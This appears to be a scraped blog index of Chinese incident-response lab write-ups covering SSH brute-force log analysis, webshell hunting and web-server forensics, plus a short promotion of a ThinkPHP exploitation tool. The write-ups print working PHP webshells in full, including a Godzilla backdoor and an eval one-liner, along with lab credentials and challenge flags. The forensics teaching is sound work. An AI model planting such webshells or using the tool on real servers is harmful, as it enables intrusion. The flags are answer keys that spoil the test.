/var/log/auth.log.1（这是固定的）\n接着那既然是爆破，那肯定会有很多失败的次数对吧？\n逻辑基本就是上面这样，如果日志少一些那还好，可以一条条进行分析，日志多的话那可能还要进行筛选；\n命令如下：\n1 cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 可以看出已给出三个地址：\n1 2 3 4 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 4 192.168.200.2 1 192.168.200.32 1 192.168.200.31 flag：\n1 flag{192.168.200.2,192.168.200.31,192.168.200.32} flag2 2.ssh爆破成功登陆的IP是多少，如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n其实思路也很简单，那既然上面我们都已经得到三个IP了，最多的次数4次，不用想肯定最可疑啊，直接提交就是：\n1 cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 简单来说就是分析auth.log.1日志文件，提取出所有包含\u0026quot;Accepted \u0026ldquo;字符串的行，然后使用awk命令提取每行的第11个字段（通常这个字段表示远程IP地址），之后对这些IP地址进行排序和统计，最后按照数量的降序排列，并通过more命令分页显示结果。\n这个命令链条通过以下步骤统计每个IP地址成功登录的次数：\n读取日志文件并筛选出成功登录的记录。 提取记录中的IP地址。 对IP地址进行排序、去重和计数。 按登录次数降序排列并逐页显示结果。\n1 2 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 2 192.168.200.2 flag2\n1 flag{192.168.200.2} flag3 3.爆破用户名字典是什么？如果有多个使用\u0026rdquo;,\u0026ldquo;分割\n那做这这种的思路是什么？\n那首先我们得了解什么是爆破用户名字典？\n简单来说指黑客在进行暴力破解攻击时使用的一系列用户名列表。黑客通过自动化工具逐个尝试这些用户名，结合常见或默认密码，试图找到有效的登录凭据。这个过程被称为“字典攻击”或“暴力破解攻击”。\n具体操作步骤；\n1 cat auth.log.1 | grep -a \u0026#34;Failed password\u0026#34; | perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|uniq -c|sort -nr 1 2 3 4 5 6 7 8 9 10 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Failed password\u0026#34; | perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|uniq -c|sort -nr 5 invalid user user 5 invalid user hello 5 invalid user 4 root 1 root 1 root 1 invalid user test3 1 invalid user test2 1 invalid user test1 flag3\n1 flag{user,hello,root,test3,test2,test1} flag4 4.成功登录 root 用户的 ip 一共爆破了多少次\n这个就更简单了，其实也和上面第一题重复了，因为问题问：有多少IP在爆破主机ssh的root账号？这里又问成功登录 root 用户的 ip 一共爆破了多少次？而且前面我们在统计IP的时候就已经顺便把次数统计出来了，所以PASS，这里没什么好说的；\n（命令还是第一题的命令，这里只是重复一下，不在多做解释）\n1 cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 1 2 3 4 root@ip-10-0-10-6:/var/log# cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 4 192.168.200.2 1 192.168.200.32 1 192.168.200.31 flag4\n1 flag{4} flag5 5.黑客登陆主机后新建了一个后门用户，用户名是多少\n这个又是一个新的知识点，问我们黑客登陆主机后新建了一个后门用户，用户名是多少？\n那这种我们怎么操作呢？（其实基本也就是这五个步骤）\n步骤1：确定日志文件\n通常与用户登录和用户管理活动相关的日志文件是 /var/log/auth.log 或其备份文件如 /var/log/auth.log.1。\n步骤2：搜索创建用户的关键字\n使用 grep 命令搜索与创建用户相关的关键字，如 new user。这样可以找到所有新建用户的日志条目。\n1 cat /var/log/auth.log.1 | grep -a \u0026#34;new user\u0026#34; 此命令会列出所有包含 new user 的日志行，这些行通常记录了用户创建的详细信息。\n步骤3：提取新用户信息\n从日志中提取新用户的详细信息，包括用户名、创建时间等。\n例如，假设你得到了如下输出：\n1 Jan 12 10:32:15 server useradd[1234]: new user: name=testuser, UID=1001, GID=1001, home=/home/testuser, shell=/bin/bash 这条日志显示了创建的新用户 testuser。\n步骤4：分析执行上下文\n确认新用户的创建是否由合法用户执行，或是否有可疑的远程登录记录。\n可以使用以下命令查找所有用户登录的情况，以确定是否有可疑的登录行为：\n1 grep \u0026#34;Accepted\u0026#34; /var/log/auth.log.1 步骤5：进一步确认\n结合其他日志文件，如 /var/log/syslog，查看是否有异常的命令执行或系统变更。\nflag\n1 flag{test2} 总结 有多少IP在爆破主机ssh的root帐号:\n命令： 1 cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 命令解释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 1. cat auth.log.1: - `cat` 命令用于显示 `auth.log.1` 文件的内容。 - 这里 `auth.log.1` 是一个日志文件，通常是系统日志的备份文件。 2. |: - 管道符号，用于将前一个命令的输出作为下一个命令的输入。 3. grep -a \u0026#34;Failed password for root\u0026#34;: - grep 命令用于在输入中搜索包含特定模式的行。 - -a 选项表示将文件内容视为文本文件（此选项通常在处理二进制文件时使用，但对于纯文本文件，可以省略）。 - `\u0026#34;Failed password for root\u0026#34;` 是搜索模式，即查找所有包含\u0026#34;Failed password for root\u0026#34;的行，这些行表示尝试登录root用户的失败尝试。 4. awk \u0026#39;{print $11}\u0026#39;: - `awk` 是一个文本处理工具，用于按字段处理文本。 - `{print $11}` 表示打印每行的第11个字段。假设日志格式为标准格式，第11个字段通常是IP地址。 5. sort: - `sort` 命令用于对输入行进行排序。 - 这里是对提取的IP地址进行排序。 6. uniq -c: - `uniq` 命令用于删除重复的行。 - `-c` 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。 7. sort -nr: - `sort` 命令再次用于排序。 - `-n` 选项表示按数值进行排序。 - `-r` 选项表示按降序排序。 - 组合起来，即按出现次数从高到低排序。 8. more: - `more` 命令用于分页显示输出。 - 由于输出可能很长，`more` 命令允许用户逐页查看结果。 ssh爆破成功登陆的IP是多少？\n命令： 1 cat auth.log.1 | grep -a \u0026#34;Accepted \u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 命令解释：\n1 2 3 grep -a \u0026#34;Accepted \u0026#34;: - 作用：在日志文件中查找包含“Accepted ”的行。这些行记录了成功的SSH登录事件。 - `-a`选项：通常用于处理二进制文件时将其视为文本文件，这里一般可以忽略，因为`auth.log.1`应该是纯文本文件 爆破用户名字典是什么？\n命令： 1 cat auth.log.1 | grep -a \u0026#34;Failed password\u0026#34; |perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;|uniq -c|sort -nr 命令解释：\n1 2 3 4 5 6 7 8 9 10 11 - grep -a \u0026#34;Failed password\u0026#34;: - 作用：在日志文件中查找包含“Failed password”的行。这些行记录了SSH登录失败的事件。 - `-a`选项：通常用于处理二进制文件时将其视为文本文件，这里一般可以忽略，因为`auth.log.1`应该是纯文本文件。 - perl -e \u0026#39;while($_=\u0026lt;\u0026gt;){ /for(.*?) from/; print \u0026#34;$1\\n\u0026#34;;}\u0026#39;: - 作用：使用Perl脚本从每一行提取出失败登录尝试的用户名。 - `while($_=\u0026lt;\u0026gt;)`：逐行读取输入。 - `/for(.*?) from/`：使用正则表达式匹配模式“for [username] from”，其中`[username]`是登录尝试的用户名。 - `print \u0026#34;$1\\n\u0026#34;`：将提取的用户名打印出来。 - uniq -c: - 作用：对提取出的用户名进行去重并计数。每个唯一的用户名会与其出现的次数一起输出。 - `-c`选项：在每个唯一项的前面显示出现次数。 成功登录 root 用户的 ip 一共爆破了多少次？\n代码： 1 cat auth.log.1 | grep -a \u0026#34;Failed password for root\u0026#34; | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | more 这个就不解释了，跟第一步一样。\n5. 黑客登陆主机后新建了一个后门用户，用户名是多少？\n命令：\n1 cat auth.log.1 |grep -a \u0026#34;new user\u0026#34; 命令解释：\n1 2 3 4 简单来说就是在 grep 命令中 -a 选项的作用是将文件视为文本文件处理，即使文件可能包含一些二进制数据。 通常，grep 会将二进制文件视为二进制数据而不是文本数据，并可能不会显示预期的结果。 使用 -a 选项可以确保 grep 按文本模式处理文件中的内容。 ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/42.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】第一章 应急响应- Linux日志分析"},{"content":"简介 1 靶机账号密码 root xjwebshell 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n2.黑客使用的什么工具的shell github地址的md5 flag{md5}\n3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx\n4.黑客免杀马完整路径 md5 flag{md5}\n开启靶场 过程 一、flag1 黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征\n1 2 3 4 find ./ type f -name \u0026#34;*.jsp\u0026#34; | xargs grep \u0026#34;exec(\u0026#34; find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; find ./ type f -name \u0026#34;*.asp\u0026#34; | xargs grep \u0026#34;execute(\u0026#34; find ./ type f -name \u0026#34;*.aspx\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; 对于免杀Webshell，可以查看是否使用编码\n1 find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;base64_decode\u0026#34; 命令解析：\n1 2 1. xargs：xargs命令用于将输入数据重新格式化后作为参数传递给其他命令。在这个命令中，`xargs`将`find`命令找到的文件列表作为参数传递给`grep`命令。 2. `grep \u0026#34;eval(\u0026#34;`：`grep`命令用于搜索文本，并输出匹配的行。这里`\u0026#34;eval(\u0026#34;`是`grep`命令的搜索模式，用于查找包含`eval(`字符串的行。 一个一个进行尝试即可：\n这里使用：\n1 find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; 发现了三个文件：\n1 2 3 ./var/www/html/include/gz.php: eval($payload); ./var/www/html/include/Db/.Mysqli.php: eval($payload); ./var/www/html/shell.php:\u0026lt;?php phpinfo();@eval($_REQUEST[1]);?\u0026gt; 打开gz.php文件\n1 2 3 4 root@ip-10-0-10-5:/# cd /var/www/html/include root@ip-10-0-10-5:/var/www/html/include# ls common.php Db default.htm gz.php index.htm index.html Model root@ip-10-0-10-5:/var/www/html/include# cat gz.php 最后终于在gz.php里面发现了，这样一段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } //027ccd04-5065-48b6-a32d-77c704a5e26d $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; $data=file_get_contents(\u0026#34;php://input\u0026#34;); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 简单分析一下这段恶意代码；\n@session_start();：启动会话 @set_time_limit(0);：设置脚本执行时间限制为无限制 @error_reporting(0);：关闭错误报告 function encode($D,$K){...}：定义了一个名为 encode 的函数，它接受两个参数 $D 和 $K。这个函数看起来像是一个简单的异或编码函数，用于对数据进行加密或解密。它使用 $K 作为密钥，对 $D 中的每个字符进行异或操作。 接下来的几行代码定义了 $payloadName、$key 和 $data 变量。$payloadName 是用于存储有效载荷的会话变量名，$key 是用于编码的密钥，$data 是从 php://input 流中读取的数据。 if ($data!==false){...}：如果从 php://input 读取的数据不是 false（即成功读取了数据），则执行以下代码块。 if (isset($_SESSION[$payloadName])){...}：检查 $payloadName 对应的会话变量是否已设置。 if (strpos($payload,\u0026quot;getBasicsInfo\u0026quot;)===false){...}：检查 $payload 变量中是否包含字符串 \u0026quot;getBasicsInfo\u0026quot;。 eval($payload);：如果 $payload 变量包含 \u0026quot;getBasicsInfo\u0026quot; 字符串，则执行 $payload 变量中的 PHP 代码。 echo encode(@run($data),$key);：如果 $data 包含 \u0026quot;getBasicsInfo\u0026quot; 字符串，则执行 @run($data) 函数，并将结果编码后输出。\n总结： 1 这段代码的目的是接收通过 php://input 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。 最后找到flag；\n1 flag{027ccd04-5065-48b6-a32d-77c704a5e26d} 二、flag2 黑客使用的什么工具的shell github地址的md5 flag{md5}\n遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；\n为什么这样说？\n哥斯拉病毒是一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：\n1 2 3 1. @session_start(); - 开启一个会话。 2. @set_time_limit(0); - 设置脚本执行时间为无限。 3. @error_reporting(0); - 关闭所有错误报告。 这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。\n所以我们只需要找到它的github地址并且进行MD5加密即可；\n1 Godzilla地址：https://github.com/BeichenDream/Godzilla 直接使用md5加密网站对网站进行加密即可！\n1 https://www.jyshare.com/front-end/703/ 1 flag{39392de3218c333f794befef07ac9257} 三、flag3 黑客使用的什么工具的shell github地址的md5 flag{md5}\n那既然说黑客隐藏shell了，那我们肯定需要用到命令ls -la进行查找；\n然后发现在挨个查找的过程中发现.Mysqlli.php如果普通的ls查看目录是查不出来的，必须用到ls -la才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；\n这里看到一个Db文件夹，然后进去查发现一个.Mysqli.php文件，cat打开一下发现是一个后门文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;3c6e0b8a9c15224a\u0026#39;; $data=file_get_contents(\u0026#34;php://input\u0026#34;); if ($data!==false){ $data=encode($data,$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); } eval($payload); echo encode(@run($data),$key); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 然后pwd一下看一下现在的绝对路径：\n1 2 3 root@ip-10-0-10-5:/var/www/html/include/Db# pwd /var/www/html/include/Db root@ip-10-0-10-5:/var/www/html/include/Db# 然后就确定文件的绝对路径：\n1 /var/www/html/include/Db/.Mysqli.php 然后进行MD5加密一下;\n得到flag：\n1 flag{aebac0e58cd6c5fad1695ee4d1ac1919} 四、flag4 黑客免杀马完整路径 md5 flag{md5}\n什么是免杀马？\n免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。\n免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在/var/log目录下。\n然后我们进入日志看一下日志文件：\n进入日志文件夹后发现一个apache2的文件夹，说明网站使用了apache2进行搭建。\n进去后，看一下access.log文件。\n进去后，发现一个top.php执行了phpinfo()；且返回值为200，有点可疑。去找到相对应的文件发现是一个正常的文件来。\n打开文件发现是一个使用base64_decode进行编码混淆了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@ip-10-0-10-5:/var/www/html# cd wap root@ip-10-0-10-5:/var/www/html/wap# ls index.php template top.php root@ip-10-0-10-5:/var/www/html/wap# cat top.php \u0026lt;?php $key = \u0026#34;password\u0026#34;; //ERsDHgEUC1hI $fun = base64_decode($_GET[\u0026#39;func\u0026#39;]); for($i=0;$i\u0026lt;strlen($fun);$i++){ $fun[$i] = $fun[$i]^$key[$i+1\u0026amp;7]; } $a = \u0026#34;a\u0026#34;; $s = \u0026#34;s\u0026#34;; $c=$a.$s.$_GET[\u0026#34;func2\u0026#34;]; 查看一下绝对路径：\n1 2 3 root@ip-10-0-10-5:/var/www/html/wap# pwd /var/www/html/wap root@ip-10-0-10-5:/var/www/html/wap# 绝对路径：\n1 /var/www/html/wap/top.php 然后进行MD5加密：\nflag：\n1 flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de} 总结 找webshell地址 1 2 3 4 5 6 7 //搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征 find ./ type f -name \u0026#34;*.jsp\u0026#34; | xargs grep \u0026#34;exec(\u0026#34; find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; find ./ type f -name \u0026#34;*.asp\u0026#34; | xargs grep \u0026#34;execute(\u0026#34; find ./ type f -name \u0026#34;*.aspx\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; //对于免杀Webshell，可以查看是否使用编码 find ./ type f -name \u0026#34;*.php\u0026#34; | xargs grep \u0026#34;base64_decode\u0026#34; 分析一下webshell是什么工具 1 可以把代码复制出来进行查询,一般就是蚁剑，哥斯拉，等等 找隐藏webshell 1 这个一般可以使用 ls -la 进行查看隐藏文件，主要需要细心找。 找免杀码，看日志。 1 access.log等等文件。 ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/43.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/","title":"【玄机靶场】第一章 应急响应- webshell查杀"},{"content":"简介 用户名:server2012\n密码:URSZf3A\nflag1 1.phpstudy-2018站点日志.(.log文件)所在路径，提供绝对路径\n• 默认路径：%SystemDrive%\\inetpub\\logs\\LogFiles\\\nflag\n1 flag{C:\\inetpub\\logs\\LogFiles\\W3SVC2} flag2 2.系统web日志中状态码为200请求的数量是多少？\n下载日志文件 awk分析\n1 awk \u0026#39;$12 == 200 \u0026#39; u_ex250220.log| wc -l flag\n1 flag{2315} flag3 3.系统web日志中出现了多少种请求方法\n继续分析请求方式\n1 awk \u0026#39;{print $4} \u0026#39; u_ex250220.log| sort| uniq -c flag\n1 flag{7} flag4 4.存在文件上传漏洞的路径是什么(flag{/xxxxx/xxxxx/xxxxxx.xxx})\n发现是emlog bing搜索emlog文件上传漏洞\n在日志文件中搜索/admin/plugin.php 并且返回值为200的日志\n找到存在文件上传漏洞的php文件\nflag\n1 flag{/emlog/admin/plugin.php} flag5 5.攻击者上传并且利用成功的webshell的文件名是什么\n打包下载源码 解压 火绒报毒\n在日志文件中搜索window.php并且返回值为200\n1 grep \u0026#34;window.php\u0026#34; u_ex250220.log | awk \u0026#39;$12==200 也找到上传用的zip插件\nhttps://github.com/yangliukk/emlog/tree/main\nflag\n1 flag{window.php} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/41.webp","permalink":"http://localhost:57441/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-iis%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","title":"【玄机靶场】日志分析-IIS日志分析"},{"content":"前提须知 1 2 3 4 5 6 7 小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件： 1.攻击者的shell密码 2.攻击者的IP地址 3.攻击者的隐藏账户名称 4.攻击者挖矿程序的矿池域名(仅域名) 5.有实力的可以尝试着修复漏洞 虚拟机账号/密码:\n1 2 用户：administrator 密码：Zgsf@admin.com 1. 攻击者的shell密码 Webshell后门检查：\n这里推荐使用D盾/河马查杀来检查webshell后门。\n登录系统后，找到web源码地址，上传D盾直接扫描web源码地址，可以看出扫出一个shell.php后门文件。\n打开shell.php文件，查看源码，获取连接密码。\n答案：rebeyond\n2. 攻击者的IP地址 查看日志信息，确定攻击者的IP地址。\n查看/分析 Apache日志可以看出攻击IP。\n答案：192.168.126.1\n3. 攻击者的隐藏账户名称 使用克隆工具，检查账号信息，确定是否存在未知管理员权限的用户信息。\n答案：hack168$\n4.攻击者挖矿程序的矿池域名 登录hack168$用户，看到一个Kuang.exe文件,发现是pyinstaller打包的exe文件,使用pyinstxtractor进行反编译。\n1 2 3 #pyinstxtractor项目地址：\u0026lt;https://github.com/extremecoders-re/pyinstxtractor\u0026gt; 挖矿病毒与反编译脚本放在一个文件夹 执行：python .\\\\pyinstxtractor.py .\\\\Kuang.exe 得到一个反编译好的文件夹，找到一个pyc的文件，Pytpyc文件是Python编译后的字节码文件，通常用于提高加载模块时的速度。\n使用在线pyc反编译工具，得到源码\n使用在线网站即可：\nhttps://www.lddgo.net/string/pyc-compile-decompile\n答案：\nURL：http://wakuang.zhigongshanfang.top\n域名：wakuang.zhigongshanfang.top\n5. 全部答案 1 2 3 4 rebeyond 192.168.126.1 hack168$ wakuang.zhigongshanfang.top ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/36.webp","permalink":"http://localhost:57441/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb1/","title":"【知攻善防靶场】web1"},{"content":"前提须知 1 2 3 4 5 6 7 8 1.攻击者的 IP 地址（两个） 2.攻击者的 webshell 文件名 3.攻击者的 webshell 密码 4.攻击者的 QQ 号 5.攻击者的服务器伪 IP 地址 6.攻击者的服务器端口 7.攻击者是如何入侵的 8.攻击者的隐藏用户名 虚拟机账号/密码：\n1 2 账号：Administrator 密码：Zgsf@qq.com 2.攻击者的 webshell 文件名 1 首先登录到系统，可以看到有一个phpstudy小皮面板，就存在搭建的网站。 1 上传D盾文件，先扫一边是否存在webshell。并且成功找到后门文件（system.php文件）成功找到第二个题目。 1 答案：system.php 3.攻击者的 webshell 密码 1 使用记事本查看一下system.php文件，发现pass为：hack6618 1 答案：hack6618 1.攻击者的 IP 地址（两个） a)第一个IP地址 1 打开小皮面板，查看一下Apache日志， 1 2 3 从日志里可以看出，192.168.126.135上传了webshell文件，说明这个IP确实是攻击者的IP地址。 192.168.126.135为第一个黑客地址。 7.攻击者是如何入侵的 1 然后我们再看一下ftp是否被攻击，一般黑客也比较喜欢使用ftp发起攻击。 1 FTP 服务中 226 为登录成功的，530 是登录失败的操作 1 2 从日志中我们可以看到黑客使用ftp服务器上传了system.php文件。这里可以确定黑客使用ftp上传的webshell。 答案：攻击者使用fpt进行入侵。 b)第二个IP地址 1 我们使用window的日志分析工具，查看远程登录连接成功的日志。 1 可以看到hack887$用户连接两次，IP地址为:192.168.126.129。 1 答案：192.168.126.129 5.攻击者的服务器伪 IP 地址 1 2 3 查看最近操作目录 使用命令：%userprofile%/Recent 可以看到黑客编辑了内网穿透工具 frp 相关的文件 1 2 3 4 5 打开frp.ini文件 看到伪 ip 256.256.66.88 伪端口 65536 1 答案：256.256.66.88 6.攻击者的服务器端口 1 2 **根据题目五得知： 答案：65536** 4.攻击者的 QQ 号 1 直接打开frp.ini文件文件位置可以看出 1 2 3 那么QQ号应该就是 答案：777888999321 8.攻击者的隐藏用户名 1 我们再使用检查隐藏用户名的脚本，看一下黑客是否新加了一个admin账号 1 答案：hack887$ 所有答案： 1 2 3 4 5 6 7 8 system.php hack6618 192.168.126.135 192.168.126.129 hack887$ 256.256.66.88 65536 777888999321 ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/37.webp","permalink":"http://localhost:57441/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb2/","title":"【知攻善防靶场】web2"},{"content":"前提须知 1 2 3 4 5 前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。 这是他的服务器，请你找出以下内容作为通关条件： 1.攻击者的两个IP地址 2.隐藏用户名称 3.黑客遗留下的flag【3个】 虚拟机账号/密码：\n1 2 用户：administrator 密码：xj@123456 登录到系统之后：\n1 看到有小皮，看一下是否存在后门文件，但未发现有用的信息，看来一下也并非后门文件。 看到有小皮，看一下是否存在后门文件，但未发现有用的信息，看来一下也并非后门文件。\n1. 隐藏用户 1 当我们去检查是否有隐藏用户时发现一个hack6618$的隐藏管理员账户。 1 答案：hack6618$ 2. 攻击者两个IP 1 2 3 4 5 先不管账号，先看一下apache的日志文件，是否有异常。 根据日志可以看出，有两个IP访问频率很高，都是一些注入信息。 所以能确定的是这两个IP为攻击IP。 192.168.75.129 192.168.75.130 1 2 3 4 根据日志可以看出 \u0026lt;http://127.0.0.1/zb_system/login.php\u0026gt; 为后台管理页面 攻击者后面一直访问 /zb_system/cmd.php?act=verify打开网站发现有登录失败的提示，攻击者可能是尝试爆破。 1 继续看日志，发现攻击者使用了admin用户成功登陆进了系统 1 2 3 尝试测试一下啊 \u0026lt;http://127.0.0.1/zb_system/admin/index.php?act=admin\u0026gt; 发现没有权限，目前仅仅只是访客状态。 1 2 3 答案：双IP： 192.168.75.129 192.168.75.130 3. 三个flag flag1 1 登录hack6618$用户看一下是否有什么信息，密码自己改一下即可 1 2 登录到系统，找到了一圈发现下载里有一个system.php文件，打开发现一个flag。 flag{888666abc} 1 答案：flag{888666abc} flag2 1 2 顺着思路找一下,下一步看看有没有自启动项或者计划任务什么的 cmd输入Taskschd.msc 1 2 成功找到flag 答案：flag{zgsfsys@sec} flag3 1 2 3 4 5 6 7 因为是z-blog博客系统，可以找一下重置密码插件，重置一下密码 在 Z-Blog官网找到密码找回工具（免密登录） #官网文章链接 \u0026lt;https://bbs.zblogcn.com/thread-83419.html\u0026gt; #工具下载地址 \u0026lt;https://update.zblogcn.com/tools/nologin.zip\u0026gt; 1 下载解压后将 nologin.php文件放到网站根目录下,直接访问即可。 1 重置完成后，发现黑客创建了一个账号 1 点击用户编辑，发现flag 1 答案：flag{H@Ck@sec} 全部答案： 1 2 3 4 5 6 192.168.75.129 192.168.75.130 hack6618$ flag{888666abc} flag{zgsfsys@sec} flag{H@Ck@sec} ","date":"2025-09-05T00:00:00Z","image":"http://localhost:57441/images/38.webp","permalink":"http://localhost:57441/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb3/","title":"【知攻善防靶场】web3"},{"content":"介绍 ThinkPHP漏洞综合利用工具, 图形化界面, 命令执行, 一键getshell, 批量检测, 日志遍历, session包含,宝塔绕过。\n下载地址 1 2 3 通过网盘分享的文件：ThinkPHP.jar 链接: https://pan.baidu.com/s/1eoU2Lf-ldHhy9W2jx8sRpA 提取码: bn8b --来自百度网盘超级会员v4的分享 项目地址 1 https://github.com/bewhale/thinkphp_gui_tools 本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。 JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块\n1 java -Dfile.encoding=\u0026#34;UTF-8\u0026#34; --module-path \u0026#34;C:\\Program Files\\Java\\javafx-sdk-11.0.2\\lib\u0026#34; --add-modules \u0026#34;javafx.controls,javafx.fxml,javafx.web\u0026#34; -jar \u0026#34;xxx.jar\u0026#34; 1 2 3 4 5 6 支持大部分ThinkPHP漏洞检测,整合20多个payload 支持部分漏洞执行命令 支持单一漏洞批量检测 支持TP3和TP5自定义路径日志遍历 支持部分漏洞一键GetShell 支持设置代理和UA ","date":"2025-09-04T00:00:00Z","image":"http://localhost:57441/images/33.webp","permalink":"http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/","title":"【Thinkphp】漏洞利用工具-thinkphp_gui_tools"},{"content":"环境搭建 1 2 3 进入Vulhub cd vulhub-master\\thinkphp\\in-sqlinjection docker compose up -d # 